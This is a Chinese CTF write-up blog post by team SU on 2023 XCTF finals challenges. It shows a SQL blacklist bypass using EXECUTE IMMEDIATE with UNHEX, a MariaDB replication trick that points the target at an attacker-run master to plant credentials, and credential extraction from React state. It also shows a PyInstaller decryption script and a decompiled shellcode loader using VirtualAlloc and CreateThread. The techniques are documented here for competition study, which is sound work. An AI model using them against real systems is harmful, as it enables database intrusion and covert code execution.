<!DOCTYPE html>
<html>
  
<head>
  <meta charset="utf-8">
  <meta name="author" content="Suers" />
  
  
  <title>2023 XCTFfinals SU Writeup | su-team</title>

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta name="keywords" content="XCTFfinals," />
  

  
  <meta name="description" content="本次2023 XCTFfinals 我们 SU 取得了第7名的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：suers_xctf@126.com或直接联系书鱼(QQ:381382770)以下是我们 SU 本次 2023XCTFfinals的 writeup">

  

  

  
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
  

  

  

  <script>
  // theme-ad's config script
  // it can be used in every script
  
  window.AD_CONFIG = {
    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":false,"count":false},
    welcome: {"enable":false,"interval":30},
    start_time: "2018-02-10",
    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
    is_post: true,
    lock: false,
    author: "Suers",
    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
    mathjax: true,
    page_type: "",
    root: "/"
  };
</script>

  
<script src="/vendor/sha256.min.js"></script>
<script src="/js/auth.js"></script>
<script src="/js/index.js"></script>
<script src="/vendor/qrcode.min.js"></script>


  
    <link rel="icon" href="/images/SU.ico">
    <link rel="apple-touch-icon" href="/images/SU.png">
  

  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

  
<link rel="stylesheet" href="/css/index.css">
<link rel="stylesheet" href="/styles/components/highlight/highlight.css">


  
<meta name="generator" content="Hexo 6.3.0"></head>
  <body>
    <header class="site-header">
  <div class="site-header-brand">
    
      <span class="site-header-brand-title">
        <a href="/">SU</a>
      </span>
    
    
      <span class="site-header-brand-motto"> | Write ups of TEAM-SU</span>
    
  </div>
  <div class="site-header-right">
    <nav class="site-header-navigation">
      
        <a href="/" target="_self">首页</a>
      
        <a href="/archives/" target="_self">归档</a>
      
        <a href="/tags/" target="_self">标签</a>
      
        <a href="/about/" target="_self">关于</a>
      
        <a href="/links/" target="_self">成员</a>
      
    </nav>
    <div class="site-header-btn">
      
        <a href="https://github.com/team-su/" target="_blank" id="site-github">
          <i class="fa fa-github-alt"></i>
        </a>
      
      <a href="javascript:void(0);" id="site-search">
        <i class="fa fa-search"></i>
      </a>
      <a href="javascript:void(0);" id="site-nav-btn">
        <i class="fa fa-ellipsis-v"></i>
      </a>
    </div>
  </div>
</header>
<nav class="table-content" id="site-nav">
  <div class="table-content-title">
    <span>导航</span>
  </div>
  <div class="table-content-main">
    <ol class="toc">
      
        <li class="toc-item">
          <a href="/" target="_self">
            首页
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/archives/" target="_self">
            归档
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/tags/" target="_self">
            标签
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/about/" target="_self">
            关于
          </a>
        </li>
      
        <li class="toc-item">
          <a href="/links/" target="_self">
            成员
          </a>
        </li>
      
    </ol>
  </div>
</nav>
<div id="site-process"></div>
    <main>
      
  <div class="passage">
  <div class="passage-meta">
    <span>
      <i class="fa fa-calendar"></i>2023-04-04
    </span>
    
    
      <span>
        | <i class="fa fa-unlock-alt"></i>UNLOCK
      </span>
    
  </div>
  <h1 class="passage-title">
    2023 XCTFfinals SU Writeup
  </h1>
  
  <article class="passage-article">
    <hr>
<p>本次2023 XCTFfinals 我们 SU 取得了第7名的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：<a href="mailto:suers_xctf@126.com">suers_xctf@126.com</a>或直接联系书鱼(QQ:381382770)<br>以下是我们 SU 本次 2023XCTFfinals的 writeup</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web-dbtrick"><a href="#web-dbtrick" class="headerlink" title="web-dbtrick"></a>web-dbtrick</h3><h4 id="0x01-预期解"><a href="#0x01-预期解" class="headerlink" title="0x01 预期解"></a>0x01 预期解</h4><p>​<img src="image-20230329192416-pn8gia5.png" alt="image">​</p>
<p>admin.php 中读代码可以发现是从ctf.admin中读取username、password，如果能查询出数据着执行readfile(‘/flag’)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#admin.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in /flag </span></span><br><span class="line"><span class="variable">$con</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>,<span class="variable">$user</span>,<span class="variable">$pass</span>); </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from ctf.admin where username=? and password=?&quot;</span>; </span><br><span class="line"><span class="variable">$sth</span> = <span class="variable">$con</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>); </span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$sth</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]]); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$sth</span>-&gt;<span class="title function_ invoke__">rowCount</span>()!==<span class="number">0</span>)&#123; </span><br><span class="line">    <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/flag&#x27;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查询数据库版本</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;version&#x27;</span></span><br><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] <span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">Array</span> ( [Variable_name] <span class="operator">=</span><span class="operator">&gt;</span> version [<span class="number">0</span>] <span class="operator">=</span><span class="operator">&gt;</span> version [<span class="keyword">Value</span>] <span class="operator">=</span><span class="operator">&gt;</span> <span class="number">10.3</span><span class="number">.38</span><span class="operator">-</span>MariaDB<span class="number">-0</span>ubuntu0<span class="number">.20</span><span class="number">.04</span><span class="number">.1</span> [<span class="number">1</span>] <span class="operator">=</span><span class="operator">&gt;</span> <span class="number">10.3</span><span class="number">.38</span><span class="operator">-</span>MariaDB<span class="number">-0</span>ubuntu0<span class="number">.20</span><span class="number">.04</span><span class="number">.1</span> ) )</span><br></pre></td></tr></table></figure>
<p>现在的思路就是获取出admin中的数据，但在测试过程中发现过滤了很多的函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">black <span class="keyword">list</span></span><br><span class="line">select</span><br><span class="line">set</span><br><span class="line">GRANTS</span><br><span class="line">create</span><br><span class="line">insert</span><br><span class="line">load</span><br><span class="line">PREPARE</span><br><span class="line">rename</span><br><span class="line">update</span><br><span class="line">HANDLER</span><br><span class="line">updatexml</span><br></pre></td></tr></table></figure>
<p>常见的思路几乎全被完全过滤，alter可用，ctf.admin表不存在，考虑需要建表，但在后续的测试中发现rename被过滤导致失败。</p>
<p>‍</p>
<p>考虑写文件查询secure_file_priv参数结果为空，但load关键字也被堵死</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show <span class="keyword">global</span> variables like <span class="string">&quot;secure%&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>最后考虑到mariadb 数据复制</p>
<p>mariadb 数据复制配置</p>
<p>在<code>/etc/mysql/my.conf [mysqld]</code>​块下添加如下三条配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">server_id       = 2</span><br><span class="line">secure_file_priv=</span><br><span class="line">log-bin         = mysql-bin</span><br></pre></td></tr></table></figure>
<ul>
<li>server_id  主从服务器的id不能为同一个，默认情况下都为1</li>
<li>secure_file_priv mysql文件写权限</li>
<li>log-bin 二进制日志</li>
</ul>
<p><a href="https://www.cnblogs.com/hongdada/p/10983768.html">MySQL - binlog日志简介及设置 - hongdada - 博客园 (cnblogs.com)</a></p>
<p>‍</p>
<p>主服务器需执行sql：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;m4x&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> REPLICATION SLAVE <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;m4x&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> database ctf;</span><br><span class="line"><span class="keyword">CREATE TABLE</span> admin (</span><br><span class="line">    id <span class="type">INT</span> <span class="keyword">NOT NULL</span> AUTO_INCREMENT,</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">150</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">    password <span class="type">VARCHAR</span>(<span class="number">150</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">    <span class="keyword">PRIMARY KEY</span> (id)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">INSERT INTO</span> admin (username, password) <span class="keyword">VALUES</span> (<span class="string">&#x27;m4x&#x27;</span>, <span class="string">&#x27;m4x&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>从服务需执行sql:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CHANGE MASTER <span class="keyword">TO</span></span><br><span class="line">	MASTER_HOST<span class="operator">=</span><span class="string">&#x27;172.30.3.168&#x27;</span>,</span><br><span class="line">	MASTER_USER<span class="operator">=</span><span class="string">&#x27;m4x&#x27;</span>,</span><br><span class="line">	MASTER_PASSWORD<span class="operator">=</span><span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">	MASTER_LOG_FILE<span class="operator">=</span><span class="string">&#x27;mysql-bin.000001&#x27;</span>,</span><br><span class="line">	MASTER_LOG_POS<span class="operator">=</span><span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">START</span> SLAVE;</span><br></pre></td></tr></table></figure>
<p>主从同步完成后即可在服务器中成功创建出admin表，并且其中的用户名密码都为可控</p>
<h4 id="0x02-清华非预期解法"><a href="#0x02-清华非预期解法" class="headerlink" title="0x02 清华非预期解法"></a>0x02 清华非预期解法</h4><p>XCTF 决赛中清华对一道web题的非预期，在该题中过滤了很多的关键字，包括<code>SELECT</code>​等，预期解为mariadb主从复制，但清华使用<code>EXECUTE IMMEDIATE</code>​绕过了黑名单导致非预期，这里详细来分析一下该种绕过方法。</p>
<h5 id="基础用法"><a href="#基础用法" class="headerlink" title="基础用法"></a>基础用法</h5><p><a href="https://docs.oracle.com/en/database/oracle/oracle-database/19/lnpls/EXECUTE-IMMEDIATE-statement.html#GUID-C3245A95-B85B-4280-A01F-12307B108DC8">EXECUTE IMMEDIATE Statement (oracle.com)</a></p>
<p>在 MariaDB 10.0.3 之后，新增了一个名为 <code>EXECUTE IMMEDIATE</code>​ 的 SQL 语句，它可以将字符串作为动态 SQL 查询语句执行。这个语句的语法如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> IMMEDIATE stmt_string [<span class="keyword">INTO</span> var_name [, ...]]</span><br></pre></td></tr></table></figure>
<p>其中，<code>stmt_string</code>​ 是要执行的 SQL 查询字符串，可以包含占位符。<code>var_name</code>​ 是可选的参数列表，用于从查询结果中接收值。</p>
<p>例如，下面的代码展示了如何使用 <code>EXECUTE IMMEDIATE</code>​ 执行一个简单的 SELECT 查询：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="variable">@id</span> <span class="operator">=</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="variable">@stmt</span> <span class="operator">=</span> CONCAT(<span class="string">&#x27;SELECT * FROM mytable WHERE id = &#x27;</span>, <span class="variable">@id</span>);</span><br><span class="line"><span class="keyword">EXECUTE</span> IMMEDIATE <span class="variable">@stmt</span>;</span><br></pre></td></tr></table></figure>
<p>在这个例子中，我们将 <code>@id</code>​ 变量的值拼接到 SQL 查询字符串中，然后使用 <code>EXECUTE IMMEDIATE</code>​ 关键字执行该查询，并输出结果。</p>
<h5 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h5><p>具体解题思路参考 The 7th XCTF Finals WEB WP 这篇文章，该题中手工测试出的黑名单如下：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">black list</span><br><span class="line"><span class="keyword">select</span></span><br><span class="line"><span class="keyword">set</span></span><br><span class="line">GRANTS</span><br><span class="line"><span class="keyword">create</span></span><br><span class="line"><span class="keyword">insert</span></span><br><span class="line">load</span><br><span class="line"><span class="keyword">PREPARE</span></span><br><span class="line">rename</span><br><span class="line"><span class="keyword">update</span></span><br><span class="line">HANDLER</span><br><span class="line">updatexml</span><br></pre></td></tr></table></figure>
<p>其中过滤了常用的几大关键字，通过<code>EXECUTE IMMEDIATE</code>​可以进行绕过</p>
<p>原题中使用的环境为mariadb 10.3.38</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> IMMEDIATE <span class="string">&#x27;SELECT * FROM ctf.admin&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>​<img src="image-20230401142002-r420bj1.png" alt="image">​</p>
<p>可以直接执行字符串中的sql语句，在基于这一点的情况下就很容易进行绕过</p>
<p>该题中并没有过滤各种字符串编码，所以我们可以使用如下方法进行绕过</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXECUTE</span> IMMEDIATE UNHEX(<span class="string">&#x27;53454c454354202a2046524f4d206374662e61646d696e&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>将<code>SELECT * FROM ctf.admin</code>​转为hex再使用UNHEX方法转换为字符串进行执行</p>
<p>​<img src="image-20230401145635-w4sxhmr.png" alt="image">​</p>
<p>同理，这里也可以使用BASE64之类的进行绕过</p>
<p>​<img src="image-20230401145844-8iwl982.png" alt="image">​</p>
<h3 id="web-signin"><a href="#web-signin" class="headerlink" title="web-signin"></a>web-signin</h3><p>React state 前端储存数据 + 后台HTTP3.0</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>] Username <span class="keyword">and</span> password store <span class="keyword">in</span>  React Redux state</span><br></pre></td></tr></table></figure>
<p><strong><a href="https://www.freebuf.com/vuls/304954.html">https://www.freebuf.com/vuls/304954.html</a></strong></p>
<blockquote>
<p>在引入了Fiber的React（16.8+），会多出 <strong>reactFiber$xxxx 属性，该属性对应的就是这个DOM在React内部对应的FiberNode，可以直接使用child属性获得子节点。节点层级可以从React Dev Tool内查看。通过读取每个FiberNode的 memoizedProps  和 memoizedState  ，即可直接获取需要的Prop和State。在高版本使用React Hooks的项目中，FiberNode的 memorizedState 是一个链表，该链表内的节点次序可以参考该组件源码内 useState 的调用顺序。旧版React，引入的属性是 </strong>reactInternalInstance  。State也是一个Object而非链表，可以方便地看到每个state的名字。</p>
</blockquote>
<p>在浏览器安装React Dev Tool，前端获取到state中的账号密码</p>
<p>​<img src="1280X1280-20230330225604-pv2q510.png" alt="1280X1280">​</p>
<p>登入后端使用HTTP3.0 发送请求即可获取到flag</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run <span class="operator">-</span>it <span class="comment">--rm ymuski/curl-http3 curl -Lv https://172.35.3.40/user/home --http3</span></span><br></pre></td></tr></table></figure>
<h2 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h2><h3 id="rev2-我不是病毒"><a href="#rev2-我不是病毒" class="headerlink" title="rev2 我不是病毒"></a>rev2 我不是病毒</h3><p>直接分析exe的话，可以发现关键的逻辑集中在main函数最后return的那个函数中，在sub_140005C80函数中会创建一个进程（要是找不到这个函数的话，先关闭地址随机化，或者自行分析），附加调试之后可以发现这个进程就是python310.dll，所以初步判断这个程序是python打包的exe。</p>
<p>用pyinstxtractor.py直接解包，可以发现有.pyz这样的文件和PYZ-00.pyz_extracted这个文件夹，而且后者中的所有文件都是加密过的</p>
<p>参考<a href="https://www.cnblogs.com/lordtianqiyi/articles/16209125.html">记python逆向 - TLSN - 博客园 (cnblogs.com)</a></p>
<p><a href="https://bbs.kanxue.com/thread-271253.htm">[原创]Python逆向——Pyinstaller逆向-软件逆向-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p>
<p>可以看到“archive.pyc就是加密的过程，crypto_key是加密的密钥，而我们需要解密.pyz文件”</p>
<p>所以分别反编译两个文件，可以找到CRYPT_BLOCK_SIZE = 16，加密方式是AES，加密密钥是</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HelloHiHowAreYou</span><br></pre></td></tr></table></figure>
<p>编写解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tinyaes</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"> </span><br><span class="line">CRYPT_BLOCK_SIZE = <span class="number">16</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 从crypt_key.pyc获取key，也可自行反编译获取</span></span><br><span class="line">key = <span class="built_in">bytes</span>(<span class="string">&#x27;HelloHiHowAreYou&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">inf = <span class="built_in">open</span>(<span class="string">&#x27;sign.pyc.encrypted&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="comment"># 打开加密文件</span></span><br><span class="line">outf = <span class="built_in">open</span>(<span class="string">&#x27;sign.pyc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="comment"># 输出文件</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 按加密块大小进行读取</span></span><br><span class="line">iv = inf.read(CRYPT_BLOCK_SIZE)</span><br><span class="line"> </span><br><span class="line">cipher = tinyaes.AES(key, iv)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">plaintext = zlib.decompress(cipher.CTR_xcrypt_buffer(inf.read()))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 补pyc头(最后自己补也行)</span></span><br><span class="line"></span><br><span class="line">outf.write(<span class="string">b&#x27;\x6F\x0D\x0D\x0A\x00\x00\x00\x00\x70\x79\x69\x30\x10\x01\x00\x00&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 写入解密数据</span></span><br><span class="line">outf.write(plaintext)</span><br><span class="line"> </span><br><span class="line">inf.close()</span><br><span class="line">outf.close()</span><br></pre></td></tr></table></figure>
<p>由于PYZ-00.pyz_extracted文件中有太多的文件，再加上我的本地反编译失败，只能用在线网站反编译，次数被限制到了10min一次，所以在做的时候一直没找到真正的加密在哪里。</p>
<p>赛后复现的时候想到了题目描述，目的是找到产品密钥</p>
<p><img src="https://renovice-1311449499.cos.ap-chongqing.myqcloud.com/img/rev2.png" alt="rev2"></p>
<p>所以找到了sign.pyc.encrypted文件，解密后</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib <span class="keyword">as</span> 沈阳</span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> 杭州</span><br><span class="line"><span class="keyword">import</span> ctypes <span class="keyword">as</span> 蚌埠</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    蚌埠.windll.kernel32.VirtualAlloc.restype = 蚌埠.c_void_p</span><br><span class="line">    福建 = <span class="built_in">input</span>(<span class="string">&#x27;%e6%82%a8%e7%9a%84%e8%be%93%e5%85%a5%ef%bc%9a&#x27;</span>)</span><br><span class="line">                 <span class="comment">#您的输入：</span></span><br><span class="line">    天津 = <span class="string">&#x27;9K98jTmDKCXlg9E2kepX4nAi8H0DB57IU57ybV37xjrw2zutw+KnxkoYur3IZzi2ep5tDC6jimCJ7fDpgQ5F3fJu4wHA0LVq9FALbjXN6nMy57KrU8DEloh+Cji3ED3eEl5YWAyb8ktBoyoOkL1c9ASWUPBniHmD7RSqWcNkykt/USjhft9+aV930Jl5VjD6qcXyZTfjnY5MH3u22O9NBEXLj3Y9N5VjEgF2cFJ+Tq7jj92iIlEkNvx8Jl+eH5/hipsonKLTnoLGXs4a0tTQX/uXQOTMBbtd70x04w1Pa0fp+vA9tCw+DXvXj0xmX8c5HMybhpPrwQYDonx7xtS+vRIj/OmU7GxkHOOqYdsGmGdTjTAUEBvZtinOxuR7mZ0r9k+c9da0W93TWm5+2LKNR6OJjmILaJn0lq4foYcfD5+JITDsOD6Vg01yLRG1B4A6OxJ7Rr/DBUabSu2fYf1c4sTFvWgfMV8il6QfJiNMGkVLey1cBPSobenMo+TQC1Ql0//9M4P01sOiwuuVKLvTyDEv6dKO//muVL9S2gq/aZUBWkjj/I5rUJ6Mlt4+jsngmuke9plAjw22fUgz+8uSzn40dhKXfBX/BOCnlwWsMGAefAfoz/XAsoVSG2ioLFmlcYe/WBgaUJEoRUSyv73yiEOTVwIK6EPnDlwRgZZHx2toLu8udpEZ0aKGkex5sn7P8Jf9AbD4/EiQU+FdoJSxGorPSZGvrc4=&#x27;</span></span><br><span class="line">    北京 = 沈阳.md5(<span class="string">&#x27;%e4%ba%91%e5%8d%97&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                    <span class="comment">#云南</span></span><br><span class="line">    重庆 = 杭州.b64decode(天津)</span><br><span class="line">    河南 = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    北京_<span class="built_in">len</span> = <span class="built_in">len</span>(北京)</span><br><span class="line">    广州 = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="comment">#初始化s盒</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + 广州[i] + <span class="built_in">ord</span>(北京[i % 北京_<span class="built_in">len</span>])) % <span class="number">256</span></span><br><span class="line">        广州[i] = 广州[j]</span><br><span class="line">        广州[j] = 广州[i]</span><br><span class="line">    山东 = 陕西 = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> 河北 <span class="keyword">in</span> 重庆:</span><br><span class="line">        山东 = (山东 + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        陕西 = (陕西 + 广州[山东]) % <span class="number">256</span></span><br><span class="line">        广州[山东] = 广州[陕西]</span><br><span class="line">        广州[陕西] = 广州[山东]</span><br><span class="line">        河南 += <span class="built_in">bytes</span>([</span><br><span class="line">            河北 ^ 广州[(广州[山东] + 广州[陕西]) % <span class="number">256</span>]])</span><br><span class="line"></span><br><span class="line">    四川 = 蚌埠.create_string_buffer(福建.encode())</span><br><span class="line"></span><br><span class="line">    黑龙江 = 蚌埠.windll.kernel32.VirtualAlloc(蚌埠.c_int(<span class="number">0</span>), 蚌埠.c_int(<span class="built_in">len</span>(河南)), 蚌埠.c_int(<span class="number">12288</span>), 蚌埠.c_int(<span class="number">64</span>))</span><br><span class="line">    蚌埠.windll.kernel32.RtlMoveMemory(蚌埠.c_void_p(黑龙江), (蚌埠.c_ubyte * <span class="built_in">len</span>(河南)).from_buffer(<span class="built_in">bytearray</span>(河南)), 蚌埠.c_size_t(<span class="built_in">len</span>(河南)))</span><br><span class="line">    辽宁 = 蚌埠.windll.kernel32.CreateThread(蚌埠.c_int(<span class="number">0</span>), </span><br><span class="line">                                        蚌埠.c_int(<span class="number">0</span>), </span><br><span class="line">                                        蚌埠.c_void_p(黑龙江), <span class="comment">#执行的代码</span></span><br><span class="line">                                        蚌埠.byref(四川),      <span class="comment">#参数w</span></span><br><span class="line">                                        蚌埠.c_int(<span class="number">0</span>), </span><br><span class="line">                                        蚌埠.pointer(蚌埠.c_int(<span class="number">0</span>)))</span><br><span class="line">    蚌埠.windll.kernel32.WaitForSingleObject(蚌埠.c_int(辽宁), 蚌埠.c_int(-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">if</span> 四川.raw == <span class="string">b&#x27;%db%1b%00Dy\\C%cc%90_%ca.%b0%b7m%ab%11%9b^h%90%1bl%19%01%0c%eduP6%0c0%7f%c5E-L%b0%fb%ba%f6%9f%00&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%e6%98%af%e7%9a%84%ef%bc%81%e4%bd%a0%e5%be%97%e5%88%b0%e4%ba%86%ef%bc%81&#x27;</span>)</span><br><span class="line">        <span class="comment">#是的！你得到了！</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="literal">None</span>(<span class="string">&#x27;%e4%b8%8d%ef%bc%8c%e5%86%8d%e5%b0%9d%e8%af%95%e6%9b%b4%e5%a4%9a%e3%80%82 %ef%bc%88%e7%ac%91%e8%84%b8%e7%ac%a6%e5%8f%b7%ef%bc%89&#x27;</span>)</span><br><span class="line">    <span class="comment">#不，再尝试更多。 （笑脸符号）</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>变量名应该是被特地修改，降低可读性的，汉字也都经过了URL编码，不过整体逻辑很好理解</p>
